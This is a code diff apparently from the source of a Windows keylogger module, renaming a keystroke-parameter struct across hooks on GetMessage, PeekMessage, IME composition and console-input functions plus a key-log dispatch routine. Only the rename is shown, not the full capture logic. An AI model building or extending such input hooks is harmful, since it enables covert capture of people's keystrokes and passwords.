@@ -20,7 +20,7 @@ typedef struct {
 	DWORD msg;
 	DWORD lprm;
 	DWORD wprm;
-} key_params_struct;
+} KEY_PARAMS;
 
 typedef struct {
 	COMMONDATA;
@@ -35,7 +35,7 @@ static BOOL _stdcall PM_GetMessage(DWORD ARG1,
 {
 	MSG *rec_msg;
 	key_log_conf_struct *key_log_conf;
-	key_params_struct key_params;
+	KEY_PARAMS key_params;
 	DWORD *arg_ptr;
 
 	MARK_HOOK
@@ -108,7 +108,7 @@ static BOOL _stdcall PM_PeekMessage(DWORD ARG1,
 									  
 {
 	MSG *rec_msg;
-	key_params_struct key_params;
+	KEY_PARAMS key_params;
 	key_log_conf_struct *key_log_conf;
 	DWORD *arg_ptr;
 
@@ -173,7 +173,7 @@ static LONG _stdcall PM_ImmGetCompositionString(DWORD ARG1,
 								                DWORD ARG4)
 									  
 {
-	key_params_struct key_params;
+	KEY_PARAMS key_params;
 	key_log_conf_struct *key_log_conf;
 	WCHAR *composition_string;
 	
@@ -228,7 +228,7 @@ static BOOL _stdcall PM_ReadConsoleInput(DWORD ARG1,
 									  
 {
 	key_log_conf_struct *key_log_conf;
-	key_params_struct key_params;
+	KEY_PARAMS key_params;
 	INPUT_RECORD *input_record;
 	DWORD buf_len;
 	DWORD i;
@@ -288,7 +288,7 @@ static BOOL _stdcall PM_ReadConsoleInputEx(DWORD ARG1,
 										   DWORD ARG5)
 									  
 {
-	key_params_struct key_params;
+	KEY_PARAMS key_params;
 	key_log_conf_struct *key_log_conf;
 	INPUT_RECORD *input_record;
 	DWORD buf_len;
@@ -354,7 +354,7 @@ static BOOL _stdcall PM_ReadConsoleA(DWORD ARG1,
 									  
 {
 	key_log_conf_struct *key_log_conf;
-	key_params_struct key_params;
+	KEY_PARAMS key_params;
 	DWORD buf_len;
 	BYTE *buffer;
 	DWORD i;
@@ -401,7 +401,7 @@ static BOOL _stdcall PM_ReadConsoleW(DWORD ARG1,
 									  
 {
 	key_log_conf_struct *key_log_conf;
-	key_params_struct key_params;
+	KEY_PARAMS key_params;
 	DWORD buf_len;
 	WCHAR *buffer;
 	DWORD i;
@@ -648,8 +648,8 @@ void ParseKey(DWORD message, DWORD lParam, DWORD wParam )
 
 DWORD __stdcall PM_KeyLogDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *dummy)
 {
-	key_params_struct *key_params;
-	key_params = (key_params_struct *)msg;
+	KEY_PARAMS *key_params;
+	key_params = (KEY_PARAMS *)msg;
 	ParseKey(key_params->msg, key_params->lprm, key_params->wprm);
 	return 1;
 }
